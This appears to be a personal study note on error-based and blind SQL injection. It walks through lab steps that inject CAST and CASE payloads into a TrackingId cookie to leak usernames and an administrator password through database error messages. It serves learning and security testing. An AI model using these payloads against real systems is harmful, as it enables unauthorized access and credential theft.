---
title: ERROR BASED INJECTION
updated: 2023-11-06 06:02:00Z
created: 2023-11-05 05:06:23Z
latitude: -33.85985000
longitude: 151.20901000
altitude: 0.0000
---

This type of query may also be useful if a character limit prevents you from triggering conditional responses.  
`CAST((SELECT my_column FROM my_table) AS int)`

ERROR: invalid input syntax for type integer: "Example data"

1.  Test with valid and invalid url  
    `?id=1` , then `?id=1'`  
    If an error is produced, locate the backend query using the error  
    For example:  
    `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'DehTc2iFswnnNSMn''. Expected char`

## BLIND SQL attacks using conditional ERRORS

`' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--`  
**CASE** expression evaluates to 'a', which does not cause any error

`' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--`  
**CASE** evaluates to 1/0, which causes a divide-by-zero error.

These inputs use the **CASE** keyword to test a condition and return a different expression depending on whether the expression is **True**:

Using this technique, you can retrieve data by testing one character at a time:  
`' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'--`

Find a GET / request that contains a **TrackingId** cookie.
In **Repeater**, append a single quote to the value of your TrackingId cookie and send the request.
`TrackingId=ogAZZfxtOKUELbuJ'`

In the response, notice the verbose error message.

In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
Confirm no errors:
`TrackingId=ogAZZfxtOKUELbuJ'--`

`TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
Observe that you now get a different error saying that an AND condition must be a boolean expression.
Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows:

`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
Confirm that you no longer receive an error. This suggests that this is a valid query again.

Adapt your generic SELECT statement so that it retrieves usernames from the database:
`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request.

`TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
Modify the query to return only one row:
`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
Observe that the error message now leaks the first username from the users table:

ERROR: invalid input syntax for type integer: "administrator"
Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:
`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
